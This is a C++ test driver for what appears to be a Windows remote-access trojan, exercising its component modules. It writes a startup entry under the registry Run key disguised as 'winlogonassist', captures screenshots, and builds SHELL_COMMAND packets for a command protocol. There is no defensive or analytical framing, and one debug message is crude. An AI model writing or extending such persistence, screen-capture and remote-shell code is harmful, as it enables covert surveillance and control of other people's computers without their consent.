#include <Windows.h>
#include <cstdio>
#include <iostream>

#include "RegistryHandler.h"
#include "ScreenshotHandler.h"
#include "CommandProtocol.h"
#include "ShellHandler.h"

void registryTest(bool debugging)
{
	RegistryHandler reg(TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"));
	if (!debugging) {
		reg.Write(TEXT("winlogonassist"), TEXT("bla bla"));
	}
}

void screenshotTest(bool debugging)
{
	(void)debugging;
	ScreenshotHandler screen(1);
	screen.CaptureAnImage(TEXT("hello.bmp"));
}

void protocolTest(bool debugging)
{
	(void)debugging;
	CMDPacket cmd(CMDPacket::CMDType::SHELL_COMMAND, CMDPacket::NONE, 0x0, TEXT("ipconfig"));
	DWORD length = 0;
	BYTE * binary = cmd.ToBinary(&length);
	if (binary == NULL) {
		std::cout << "oops";
	}

	CMDPacket::CMDHeader header = CMDPacket::FromBinary(binary, length);
	CMDPacket cmd2(header, binary + HEADER_SIZE, length - HEADER_SIZE);
	CMDPacket cmd3(CMDPacket::CMDType::SHELL_COMMAND, CMDPacket::NONE, 0x0, binary + HEADER_SIZE, length - HEADER_SIZE);

	if (cmd == cmd2) {
		if (cmd == cmd3) {
			std::cout << "yay!";
		} else {
			std::cout << "fuqu u";
		}
	} else {
		std::cout << "nay!";
	}
}

void shellTest(bool debugging)
{
	(void)debugging;

	GetThumbnail(L"d:\\Downloads\\test\\Instagram_files" , L"10518124_499199743560092_1319829904_a.jpg");

}
int main()
{
	bool debugging = true;
	
	registryTest(debugging);
	screenshotTest(debugging);
	protocolTest(debugging);
	shellTest(debugging);

	//CMDPacket cmd(CMDPacket::CMDType::SHELL_COMMAND, CMDPacket::NONE, 0x0, TEXT("ipconfig"));
}